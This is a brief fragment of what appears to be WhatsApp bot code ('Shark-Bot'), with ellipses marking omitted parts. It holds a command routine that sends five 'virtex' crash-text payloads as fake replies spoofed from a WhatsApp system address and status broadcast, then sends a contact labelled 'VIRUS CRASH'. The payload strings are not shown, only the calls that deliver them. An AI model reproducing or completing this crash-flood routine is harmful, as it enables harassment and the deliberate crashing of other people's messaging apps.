...
conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By Shark-Bot Por El Chema 👹* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By Shark-Bot Por El Chema 👹* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By Shark-Bot Por El Chema 👹* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By Shark-Bot Por El Chema 👹* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By Shark-Bot Por El Chema 👹* 🔥', 'status@broadcast')} 
break
...
await conn.sendContact(from, '🔥 VIRUS CRASH BY Shark-Bot Por El Chema 👹 🔥', fkontaak)}
break   
